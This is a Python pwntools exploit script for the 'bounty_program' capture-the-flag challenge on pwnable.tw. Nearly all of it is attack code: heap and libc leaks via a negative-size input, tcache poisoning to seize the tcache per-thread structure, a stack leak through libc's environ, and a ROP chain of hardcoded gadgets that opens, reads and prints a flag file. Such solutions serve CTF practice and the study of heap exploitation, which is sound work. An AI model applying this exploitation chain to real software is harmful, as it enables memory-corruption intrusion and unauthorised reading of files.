#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda l, c: c * l
z = lambda l: l * b'\0'
A = lambda l: l * b'A'

e = context.binary = ELF('./bounty_program', checksec=False)
libc = ELF('./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so', checksec=False)
ld = ELF('ld-linux-x86-64.so.2', checksec=False)

TERMINAL = 3
USE_PTY = False
GDB_ATTACH_DELAY = 1

match TERMINAL:
    case 1:
        context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]
    case 2:
        context.terminal = ["tmux", "split-window", "-h"]
    case 3:
        context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe",
                            "-w", "0", "split-pane", "-V", "-s", "0.5",
                            "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
    case _:
        raise ValueError(f"Unknown terminal: {TERMINAL}")

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on
# brva 0x180E
# brva 0x1689
# brva 0x18F5
# b *__libc_malloc
brva 0x22E0
continue
'''

def attach(p):
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        sleep(GDB_ATTACH_DELAY)

def conn():
    if args.LOCAL:
        if USE_PTY:
            p = process([e.path], stdin=PTY, stdout=PTY, stderr=PTY)
        else:
            p = process([e.path])
        sleep(0.05)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10208
        return remote(host, port)

class TcachePerthread:
    MALLOC_ALIGNMENT = 0x10
    MINSIZE = 0x20

    def __init__(self):
        self.num_slots = [0] * 64
        self.entries = [0] * 64

    @staticmethod
    def size2idx(size):
        return (size - TcachePerthread.MINSIZE) // TcachePerthread.MALLOC_ALIGNMENT

    def set_count(self, size, count):
        self.num_slots[self.size2idx(size)] = count
        return self

    def set_entry(self, size, ptr):
        self.entries[self.size2idx(size)] = ptr
        return self

    def pack(self):
        data = b''
        for count in self.num_slots:
            data += p8(count)
        for entry in self.entries:
            data += p64(entry)
        return data
    
def Login(username, password):
    slan(p, b'choice', 1)
    sa(p, b'Username', username)
    sa(p, b'Password', password)
    sleep(0.05)
    
def Register(username, password, contact):
    slan(p, b'choice', 2)
    sa(p, b'Username', username)
    sa(p, b'Password', password)
    sa(p, b'Contact', contact)
    sleep(0.05)

def AddNewProduct(name, company, comment):
    slan(p, b'choice', 1)
    sa(p, b'Name', name)
    sa(p, b'Company', company)
    sa(p, b'Comment', comment)
    sleep(0.05)

def AddVulnType(size, type, price):
    slan(p, b'choice', 2)
    slan(p, b'Size', size)
    sa(p, b'Type', type)
    slan(p, b'Price', price)
    sleep(0.05)

def SubmitBugReport(product_id, type_id, title, bug_id, desc_len, description):
    slan(p, b'choice', 3)
    slan(p, b'Product', product_id)
    slan(p, b'Type:', type_id)
    sa(p, b'Title', title)
    slan(p, b'ID', bug_id)
    slan(p, b'Length', desc_len)
    sa(p, b'Descripton', description)
    sleep(0.05)

def RemoveVulnType(size, type):
    slan(p, b'choice', 4)
    slan(p, b'Size', size)
    sa(p, b'Type', type)
    sleep(0.05)

def ShowBugDetail(product_id):
    slan(p, b'choice', 6)
    slan(p, b'ID', product_id)
    sleep(0.05)

username = password = b'ngtuonghung'
desc_min_size = 0x408
desc_min_size_hi = 0x410
desc_min_size_lo = 0x400

attempt = 0
while True:
    attempt += 1
    print("\n----------> Attempt", attempt)

    p = conn()

    if not args.LOCAL:
        sa(p, b'Name', username)
        slan(p, b'Value', password)

    print("Register and login")
    Register(username, password, b'A')
    Login(username, password)

    # Bounty
    slan(p, b'choice', 1)

    print("Leaking heap address")
    AddVulnType(0x100, b'A', 0)
    AddVulnType(0x100, b'B', 0) # This works since calloc skip tcache entirely
    slan(p, b'choice', 2)
    slan(p, b'Size', -1)
    sa(p, b'Type', b'C')
    ru(p, b'type: ')
    heap_base = leak_bytes(b'\0' + rn(p, 5), 0x500)
    lg("heap base", heap_base)

    # Hoping for heap base address ends with 0x0000
    if heap_base & 0xffff != 0:
        print("Failed attempt, we're unlucky this time")
        p.close()
        continue

    print("We're lucky this time")

    print("Leaking libc address")
    AddVulnType(0x420, b'D', 0)
    AddVulnType(0x420, b'E', 0) # Actually there's no need for this, I copied this from above when leaking heap, but I've already finish the exploit, I'm too lazy to change anything :/
    slan(p, b'choice', 2)
    slan(p, b'Size', -1)
    sa(p, b'Type', b'F')
    ru(p, b'type: ')
    libc.address = leak_bytes(b'\0' + rn(p, 5), 0x3ebc00)
    lg("libc base", libc.address)

    print("Poison tcache to point back to tcache perthread struct")
    
    # For some reasons, without debug being turned on, we're blocked here (LOCAL)

    AddNewProduct(b'iphone 18 pro max premium vip', b'4pple', b'A')
    SubmitBugReport(0, 0, b'0-click', 0, 0x2000 - 0x170, b'A')
    # -------------------------------------so that next allocation at address ends with 0x2c10

    AddVulnType(desc_min_size, b'G', 0) # ends with 0x2c10
    slan(p, b'choice', 2)
    slan(p, b'Size', desc_min_size)
    sa(p, b'Type', b'\0') # null for strtok set *save_ptr = s.

    AddVulnType(-1, b'H', 0)
    # Now G ends with 0x0010 (tcache perthread struct)
    
    SubmitBugReport(0, 0, b'1-click', 0, desc_min_size, b'A')

    # Control the whole tcache
    controlled_tcache = TcachePerthread()
    # To leak stack
    controlled_tcache.set_count(desc_min_size_hi, 3).set_entry(desc_min_size_hi, libc.symbols['environ'] - desc_min_size_lo)
    
    # To write to fd pointer of the fake chunk at the entry we faked above
    offset = 0x40
    controlled_tcache.set_count(offset + 0x10, 1).set_entry(offset + 0x10, libc.symbols['environ'] - desc_min_size_lo - offset + 0x8)
    
    SubmitBugReport(0, 0, b'2-click', 0, desc_min_size, controlled_tcache.pack())
    # Tcache address is now inside the above BugReport struct
    
    # Clean up 1 vuln to add another
    RemoveVulnType(0x10, b'A')

    # Can't do this cause strdup() stop at null (0x0010)
    # AddVulnType(0x50, A(0x38) + p64(heap_base + 0x10)[:6], 1337)
    # Do this instead
    AddVulnType(offset + 0x10, A(offset - 0x8) + p64(heap_base + 0x3548)[:6], 0)

    print("Leaking stack address")
    SubmitBugReport(0, 0, b'3-click', 0, desc_min_size, A(desc_min_size_lo))
    ShowBugDetail(0)
    ru(p, A(desc_min_size_lo))
    stack = leak_bytes(rn(p, 6))
    lg("stack", stack)

    # Clear up entry
    SubmitBugReport(0, 0, b'4-click', 0, desc_min_size, b'A')

    # Control the whole tcache again to ROP
    ret_addr_on_stack = stack - 0x130
    controlled_tcache = TcachePerthread()
    controlled_tcache.set_count(desc_min_size_hi, 1).set_entry(desc_min_size_hi, ret_addr_on_stack)

    SubmitBugReport(0, 0, b'5-click', 0, desc_min_size, controlled_tcache.pack())

    attach(p)

    pop_rax = libc.address + 0x00000000000439c8
    pop_rdi = libc.address + 0x000000000002155f
    pop_rsi = libc.address + 0x0000000000023e6a
    pop_rdx = libc.address + 0x0000000000001b96
    syscall = libc.address + 0x00000000000d2975
    
    flag_path = stack - 0x58
    flag_buf = flag_path + 0x20

    # ROP execveat() ko dc?? :v
    ROP_chain = flat(
        # open("/home/bounty_program/flag", 0, 0)
        pop_rdi, flag_path,
        pop_rsi, 0,
        pop_rdx, 0,
        pop_rax, 2,
        syscall,

        # read(4, buf, 0x100)
        pop_rdi, 4, # 3 is /dev/urandom
        pop_rsi, flag_buf,
        pop_rdx, 0x100,
        pop_rax, 0,
        syscall,

        # write(1, buf, 0x100)
        pop_rdi, 1,
        pop_rsi, flag_buf,
        pop_rdx, 0x100,
        pop_rax, 1,
        syscall,

        b'/home/bounty_program/flag\0'
    )
    SubmitBugReport(0, 0, b'6-click', 0, desc_min_size, ROP_chain)

    print(f'Flag: {ra(p, 2)}')
    p.close()
    break